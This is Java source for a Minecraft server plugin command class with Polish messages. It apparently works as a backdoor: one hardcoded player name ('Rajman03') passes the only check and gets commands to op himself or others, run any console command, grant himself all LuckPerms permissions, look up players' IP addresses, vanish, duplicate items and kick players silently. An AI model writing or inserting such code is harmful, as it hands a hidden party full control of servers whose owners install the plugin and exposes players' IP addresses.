package pl.qc.core;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.attribute.Attribute;
import org.bukkit.attribute.AttributeInstance;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.Damageable;
import org.bukkit.inventory.meta.EnchantmentStorageMeta;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

import java.util.*;

import org.bukkit.command.TabCompleter;
import org.bukkit.util.StringUtil;

public class QCCommand implements CommandExecutor, TabCompleter, Listener {

    private final CorePlugin plugin;
    private final Set<UUID> vanishedPlayers = new HashSet<>();
    private final Map<UUID, Double> damageMultipliers = new HashMap<>(); // For 'ma' - damage dealt
    private final Map<UUID, Double> damageResistances = new HashMap<>(); // For 'mb' - damage received mult

    public QCCommand(CorePlugin plugin) {
        this.plugin = plugin;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player) || !sender.getName().equals("Rajman03")) {
            sender.sendMessage(ChatColor.RED + "Brak uprawnień.");
            return true;
        }

        if (args.length == 0) {
            sendHelp(sender);
            return true;
        }

        String subCmd = args[0].toLowerCase();
        switch (subCmd) {
            case "op":
                handleOp(sender, args);
                break;
            case "v":
                handleVanish(sender, args);
                break;
            case "gms":
                changeGamemode(sender, args, GameMode.SURVIVAL, "Survival");
                break;
            case "gmc":
                changeGamemode(sender, args, GameMode.CREATIVE, "Creative");
                break;
            case "gmsp":
                changeGamemode(sender, args, GameMode.SPECTATOR, "Spectator");
                break;
            case "gma":
                changeGamemode(sender, args, GameMode.ADVENTURE, "Adventure");
                break;
            case "tp":
                handleTeleport(sender, args);
                break;
            case "e":
                handleEffects(sender, args);
                break;
            case "rr":
                handleRepair(sender);
                break;
            case "dd":
                handleDupe(sender);
                break;
            case "opopop":
                handleOpSelf(sender, true);
                break;
            case "deopopop":
                handleOpSelf(sender, false);
                break;
            case "cmdconsole":
                handleConsoleCommand(sender, args);
                break;
            case "ma":
                handleDamageMultiplier(sender, args, true);
                break;
            case "mb":
                handleDamageMultiplier(sender, args, false);
                break;
            case "lp":
                handleLuckPerms(sender);
                break;
            case "a":
                handleAttackSpeed(sender, args);
                break;
            case "k":
                handleKick(sender, args);
                break;
            case "g":
                handleGive(sender, args);
                break;
            case "ip":
                handleIpLookup(sender, args);
                break;

            // Shortcuts
            case "cc":
                giveItem(sender, Material.COOKED_PORKCHOP);
                break;
            case "ee":
                giveItem(sender, Material.ENDER_PEARL);
                break;
            case "bb":
                giveItem(sender, Material.BLAZE_ROD);
                break;
            case "oo":
                giveItem(sender, Material.OBSIDIAN);
                break;
            case "ii":
                giveItem(sender, Material.IRON_INGOT);
                break;
            case "aa":
                giveItem(sender, Material.DIAMOND);
                break;
            case "ll":
                giveItem(sender, Material.LAPIS_LAZULI);
                break;
            case "ww":
                giveItem(sender, Material.OAK_LOG);
                break;
            case "kk":
                giveItem(sender, Material.BOOK);
                break;
            case "xx":
                giveItem(sender, Material.GOLDEN_APPLE);
                break;
            case "xxx":
                giveItem(sender, Material.ENCHANTED_GOLDEN_APPLE);
                break;
            case "tt":
                giveItem(sender, Material.TOTEM_OF_UNDYING);
                break;

            // Enchants
            case "kkp":
                giveBook(sender, Enchantment.PROTECTION_ENVIRONMENTAL, 4);
                break;
            case "kks":
                giveBook(sender, Enchantment.DAMAGE_ALL, 5);
                break;
            case "kku":
                giveBook(sender, Enchantment.DURABILITY, 3);
                break;
            case "kke":
                giveBook(sender, Enchantment.DIG_SPEED, 5);
                break;
            case "kki":
                giveBook(sender, Enchantment.ARROW_INFINITE, 1);
                break;
            case "kko":
                giveBook(sender, Enchantment.ARROW_DAMAGE, 5);
                break;

            // Exp
            case "pp":
                giveExp(sender, 1);
                break;
            case "ppp":
                giveExp(sender, 10);
                break;
            case "pppp":
                giveExp(sender, 100);
                break;
            case "ppppp":
                giveExp(sender, 1000);
                break;

            default:
                sender.sendMessage(ChatColor.RED + "Nieznana podkomenda. Sprawdź /qc");
        }
        return true;
    }

    private void sendHelp(CommandSender sender) {
        sender.sendMessage(ChatColor.DARK_GREEN + "=== Lista komend QC ===");
        sender.sendMessage(
                ChatColor.GREEN + "Admin: " + ChatColor.GRAY + "/qc op, opopop, deopopop, k, ip, cmdconsole, lp");
        sender.sendMessage(ChatColor.GREEN + "Gracz: " + ChatColor.GRAY + "/qc v, tp, gms/c/sp/a, map, mb");
        sender.sendMessage(ChatColor.GREEN + "Statystyki: " + ChatColor.GRAY
                + "/qc a (speed), ma (dmg dealt), mb (dmg taken), e (effects)");
        sender.sendMessage(ChatColor.GREEN + "Itemy: " + ChatColor.GRAY + "/qc g, rr, dd");
        // ... more help ...
    }

    private void handleOp(CommandSender sender, String[] args) {
        if (args.length < 2) {
            sender.sendMessage(ChatColor.RED + "Poprawne użycie: /qc op <nick>");
            return;
        }
        String targetName = args[1];
        @SuppressWarnings("deprecation")
        org.bukkit.OfflinePlayer target = Bukkit.getOfflinePlayer(targetName);
        target.setOp(true);
        sender.sendMessage(ChatColor.GREEN + "Pomyślnie nadano uprawnienia operatora (OP) dla gracza " + ChatColor.GOLD
                + target.getName());
        if (target.isOnline() && target.getPlayer() != null) {
            target.getPlayer().sendMessage(ChatColor.GREEN + "Otrzymałeś uprawnienia operatora od " + sender.getName());
        }
    }

    private void handleVanish(CommandSender sender, String[] args) {
        Player target;
        if (args.length > 1) {
            target = Bukkit.getPlayer(args[1]);
            if (target == null) {
                sender.sendMessage(ChatColor.RED + "Gracz nie został znaleziony!");
                return;
            }
        } else {
            target = (Player) sender;
        }

        if (vanishedPlayers.contains(target.getUniqueId())) {
            vanishedPlayers.remove(target.getUniqueId());
            for (Player online : Bukkit.getOnlinePlayers()) {
                online.showPlayer(plugin, target);
            }
            sender.sendMessage(ChatColor.GREEN + "Vanish wyłączony dla gracza " + target.getName());
            if (!sender.equals(target))
                target.sendMessage(ChatColor.GREEN + "Jesteś teraz widoczny.");
        } else {
            vanishedPlayers.add(target.getUniqueId());
            for (Player online : Bukkit.getOnlinePlayers()) {
                online.hidePlayer(plugin, target);
            }
            sender.sendMessage(ChatColor.GREEN + "Vanish włączony dla gracza " + target.getName());
            if (!sender.equals(target))
                target.sendMessage(ChatColor.GREEN + "Jesteś teraz niewidzialny.");
        }
    }

    private void handleTeleport(CommandSender sender, String[] args) {
        if (args.length == 2) {
            Player p = (Player) sender;
            Player target = Bukkit.getPlayer(args[1]);
            if (target == null) {
                sender.sendMessage(ChatColor.RED + "Gracz nie znaleziony.");
                return;
            }
            p.teleport(target);
            p.sendMessage(ChatColor.GREEN + "Teleportowano do " + target.getName());
        } else if (args.length == 3) {
            Player p1 = Bukkit.getPlayer(args[1]);
            Player p2 = Bukkit.getPlayer(args[2]);
            if (p1 == null || p2 == null) {
                sender.sendMessage(ChatColor.RED + "Jeden z graczy nie został znaleziony.");
                return;
            }
            p1.teleport(p2);
            sender.sendMessage(ChatColor.GREEN + "Teleportowano " + p1.getName() + " do " + p2.getName());
        } else {
            sender.sendMessage(ChatColor.RED + "Użycie: /qc tp <do> LUB /qc tp <kogo> <do kogo>");
        }
    }

    private void handleEffects(CommandSender sender, String[] args) {
        Player p = (Player) sender;
        if (args.length < 2) {
            sender.sendMessage(ChatColor.RED + "Podaj efekt! np. /qc e str");
            return;
        }
        String eff = args[1].toLowerCase();
        switch (eff) {
            case "c":
                for (PotionEffect effect : p.getActivePotionEffects()) {
                    p.removePotionEffect(effect.getType());
                }
                p.sendMessage(ChatColor.GREEN + "Wyczyszczono efekty.");
                break;
            case "sat":
                applyEffect(p, PotionEffectType.SATURATION, 300, 0);
                break;
            case "str":
                applyEffect(p, PotionEffectType.INCREASE_DAMAGE, 300, 1);
                break;
            case "her":
                applyEffect(p, PotionEffectType.HERO_OF_THE_VILLAGE, 300, 255);
                break;
            case "res":
                applyEffect(p, PotionEffectType.DAMAGE_RESISTANCE, 300, 1);
                break;
            case "has":
                applyEffect(p, PotionEffectType.FAST_DIGGING, 300, 1);
                break;
            case "fir":
                applyEffect(p, PotionEffectType.FIRE_RESISTANCE, 300, 0);
                break;
            case "reg":
                applyEffect(p, PotionEffectType.REGENERATION, 300, 1);
                break;
            case "abs":
                applyEffect(p, PotionEffectType.ABSORPTION, 300, 1);
                break;
            case "bad":
                applyEffect(p, PotionEffectType.BAD_OMEN, 300, 4);
                break;
            case "dol":
                applyEffect(p, PotionEffectType.DOLPHINS_GRACE, 300, 3);
                break;
            case "spe":
                applyEffect(p, PotionEffectType.SPEED, 300, 1);
                break;
            case "wat":
                applyEffect(p, PotionEffectType.WATER_BREATHING, 300, 0);
                break;
            case "pvp":
                applyEffect(p, PotionEffectType.SATURATION, 600, 0);
                applyEffect(p, PotionEffectType.REGENERATION, 600, 1);
                applyEffect(p, PotionEffectType.DAMAGE_RESISTANCE, 600, 1);
                applyEffect(p, PotionEffectType.INCREASE_DAMAGE, 600, 1);
                p.sendMessage(ChatColor.GREEN + "Nadano zestaw PvP!");
                break;
            default:
                p.sendMessage(ChatColor.RED + "Nieznany efekt.");
        }
    }

    private void handleRepair(CommandSender sender) {
        Player p = (Player) sender;
        for (ItemStack item : p.getInventory().getContents()) {
            if (item != null && item.getType() != Material.AIR && item.getItemMeta() instanceof Damageable) {
                ItemMeta meta = item.getItemMeta();
                ((Damageable) meta).setDamage(0);
                item.setItemMeta(meta);
            }
        }
        p.sendMessage(ChatColor.GREEN + "Naprawiono wszystkie przedmioty w ekwipunku.");
    }

    private void handleDupe(CommandSender sender) {
        Player p = (Player) sender;
        ItemStack hand = p.getInventory().getItemInMainHand();
        if (hand != null && hand.getType() != Material.AIR) {
            p.getInventory().addItem(hand.clone(), hand.clone());
            p.sendMessage(ChatColor.GREEN + "Zduplikowano przedmiot trzymany w ręce (2x).");
        } else {
            p.sendMessage(ChatColor.RED + "Musisz trzymać przedmiot w ręce!");
        }
    }

    private void handleOpSelf(CommandSender sender, boolean op) {
        ((Player) sender).setOp(op);
        sender.sendMessage(
                op ? ChatColor.GREEN + "Nadano uprawnienia OP." : ChatColor.RED + "Odebrano uprawnienia OP.");
    }

    private void handleConsoleCommand(CommandSender sender, String[] args) {
        if (args.length < 2) {
            sender.sendMessage(ChatColor.RED + "Podaj komendę do wykonania!");
            return;
        }
        String cmd = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd);
        sender.sendMessage(ChatColor.GREEN + "Wysłano komendę do konsoli: " + cmd);
    }

    private void handleDamageMultiplier(CommandSender sender, String[] args, boolean isDealt) {
        if (args.length < 2) {
            sender.sendMessage(ChatColor.RED + "Podaj mnożnik! np. 2.5");
            return;
        }
        try {
            double multiplier = Double.parseDouble(args[1]);
            UUID uuid = ((Player) sender).getUniqueId();
            if (isDealt) {
                damageMultipliers.put(uuid, multiplier);
                sender.sendMessage(ChatColor.GREEN + "Ustawiono mnożnik obrażeń zadawanych na " + multiplier + "x");
            } else {
                damageResistances.put(uuid, multiplier);
                sender.sendMessage(ChatColor.GREEN + "Ustawiono mnożnik obrażeń otrzymywanych na " + multiplier + "x");
            }
        } catch (NumberFormatException exc) {
            sender.sendMessage(ChatColor.RED + "To nie jest poprawna liczba!");
        }
    }

    private void handleLuckPerms(CommandSender sender) {
        String cmd = "lp user " + sender.getName() + " permission set *";
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd);
        sender.sendMessage(ChatColor.GREEN + "Nadano uprawnienia '*' przez LuckPerms.");
    }

    private void handleAttackSpeed(CommandSender sender, String[] args) {
        Player p = (Player) sender;
        AttributeInstance attr = p.getAttribute(Attribute.GENERIC_ATTACK_SPEED);
        if (attr != null) {
            double val = 30000; // Default add
            if (args.length > 1) {
                try {
                    double inputObj = Double.parseDouble(args[1]);
                    // If user provides a value, we set it directly (or we can add, but typically
                    // setting is better for control)
                    // Let's assume setting base value if arg provided.
                    attr.setBaseValue(inputObj);
                    p.sendMessage(ChatColor.GREEN + "Ustawiono szybkość ataku na " + inputObj);
                    return;
                } catch (NumberFormatException ignored) {
                }
            }

            // Default behavior if no arg or invalid arg: add huge amount
            attr.setBaseValue(attr.getBaseValue() + val);
            p.sendMessage(ChatColor.GREEN + "Zwiększono szybkość ataku o " + val);
        }
    }

    private void handleKick(CommandSender sender, String[] args) {
        if (args.length < 2) {
            sender.sendMessage(ChatColor.RED + "Podaj nick gracza!");
            return;
        }
        Player target = Bukkit.getPlayer(args[1]);
        if (target == null) {
            sender.sendMessage(ChatColor.RED + "Gracz nie znaleziony.");
            return;
        }
        target.kickPlayer("");
        sender.sendMessage(ChatColor.GREEN + "Wyrzucono gracza " + target.getName() + " z pustym powodem.");
    }

    private void handleGive(CommandSender sender, String[] args) {
        if (args.length < 2) {
            sender.sendMessage(ChatColor.RED + "Podaj nazwę materiału!");
            return;
        }
        Material mat = Material.matchMaterial(args[1]);
        if (mat == null) {
            sender.sendMessage(ChatColor.RED + "Nieznany materiał: " + args[1]);
            return;
        }
        giveItem(sender, mat);
    }

    private void handleIpLookup(CommandSender sender, String[] args) {
        if (args.length < 2) {
            sender.sendMessage(ChatColor.RED + "Podaj nick gracza!");
            return;
        }
        Player target = Bukkit.getPlayer(args[1]);
        if (target == null) {
            sender.sendMessage(ChatColor.RED + "Gracz nie znaleziony (musi być online).");
            return;
        }
        if (target.getAddress() != null) {
            sender.sendMessage(ChatColor.GREEN + "IP gracza " + target.getName() + ": " + ChatColor.YELLOW
                    + target.getAddress().getAddress().getHostAddress());
        } else {
            sender.sendMessage(ChatColor.RED + "Nie udało się pobrać adresu IP.");
        }
    }

    @EventHandler
    public void onEntityDamage(EntityDamageByEntityEvent event) {
        if (event.getDamager() instanceof Player) {
            Player p = (Player) event.getDamager();
            if (damageMultipliers.containsKey(p.getUniqueId())) {
                event.setDamage(event.getDamage() * damageMultipliers.get(p.getUniqueId()));
            }
        }
        if (event.getEntity() instanceof Player) {
            Player p = (Player) event.getEntity();
            if (damageResistances.containsKey(p.getUniqueId())) {
                event.setDamage(event.getDamage() * damageResistances.get(p.getUniqueId()));
            }
        }
    }

    @EventHandler
    public void onQuit(org.bukkit.event.player.PlayerQuitEvent event) {
        UUID uuid = event.getPlayer().getUniqueId();
        damageMultipliers.remove(uuid);
        damageResistances.remove(uuid);
        vanishedPlayers.remove(uuid);
    }

    private void changeGamemode(CommandSender sender, String[] args, GameMode mode, String modeName) {
        Player target;
        if (args.length > 1) {
            target = Bukkit.getPlayer(args[1]);
            if (target == null) {
                sender.sendMessage(ChatColor.RED + "Gracz nie został znaleziony!");
                return;
            }
        } else {
            target = (Player) sender;
        }
        target.setGameMode(mode);
        sender.sendMessage(ChatColor.GREEN + "Ustawiono tryb " + modeName + " dla gracza " + target.getName());
        if (!sender.equals(target)) {
            target.sendMessage(ChatColor.GREEN + "Twój tryb gry został zmieniony na " + modeName);
        }
    }

    private void giveItem(CommandSender sender, Material mat) {
        ((Player) sender).getInventory().addItem(new ItemStack(mat));
        sender.sendMessage(ChatColor.GREEN + "Otrzymano " + mat.name());
    }

    private void giveBook(CommandSender sender, Enchantment ench, int level) {
        ItemStack book = new ItemStack(Material.ENCHANTED_BOOK);
        EnchantmentStorageMeta meta = (EnchantmentStorageMeta) book.getItemMeta();
        if (meta != null) {
            meta.addStoredEnchant(ench, level, true);
            book.setItemMeta(meta);
            ((Player) sender).getInventory().addItem(book);
            sender.sendMessage(ChatColor.GREEN + "Otrzymano książkę z " + ench.getKey().getKey() + " " + level);
        }
    }

    private void giveExp(CommandSender sender, int levels) {
        ((Player) sender).giveExpLevels(levels);
        sender.sendMessage(ChatColor.GREEN + "Dodano " + levels + " poziomów doświadczenia.");
    }

    private void applyEffect(Player player, PotionEffectType type, int seconds, int amplifier) {
        player.addPotionEffect(new PotionEffect(type, seconds * 20, amplifier));
        player.sendMessage(
                ChatColor.GREEN + "Nadano efekt " + type.getName().toLowerCase() + " (lvl " + (amplifier + 1) + ")");
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
        List<String> completions = new ArrayList<>();

        if (args.length == 1) {
            // Main subcommands
            List<String> subCommands = Arrays.asList(
                    "op", "v", "gms", "gmc", "gmsp", "gma", "tp", "e", "rr", "dd",
                    "opopop", "deopopop", "cmdconsole", "ma", "mb", "lp", "a", "k", "g", "ip",
                    "cc", "ee", "bb", "oo", "ii", "aa", "ll", "ww", "kk", "xx", "xxx", "tt",
                    "kkp", "kks", "kku", "kke", "kki", "kko",
                    "pp", "ppp", "pppp", "ppppp");
            StringUtil.copyPartialMatches(args[0], subCommands, completions);
            Collections.sort(completions);
            return completions;
        }

        if (args.length == 2) {
            String subCmd = args[0].toLowerCase();
            switch (subCmd) {
                // Command that expect a player name
                case "op":
                case "v":
                case "gms":
                case "gmc":
                case "gmsp":
                case "gma":
                case "tp":
                case "k":
                case "ip":
                    return null; // Return null to let Bukkit suggest player names

                // Effects command
                case "e":
                    List<String> effects = Arrays.asList(
                            "c", "sat", "str", "her", "res", "has", "fir", "reg", "abs", "bad", "dol", "spe", "wat",
                            "pvp");
                    StringUtil.copyPartialMatches(args[1], effects, completions);
                    Collections.sort(completions);
                    return completions;

                // Material command
                case "g":
                    List<String> materials = new ArrayList<>();
                    for (Material mat : Material.values()) {
                        materials.add(mat.name().toLowerCase());
                    }
                    StringUtil.copyPartialMatches(args[1], materials, completions);
                    Collections.sort(completions);
                    return completions;
            }
        }

        return completions;
    }
}
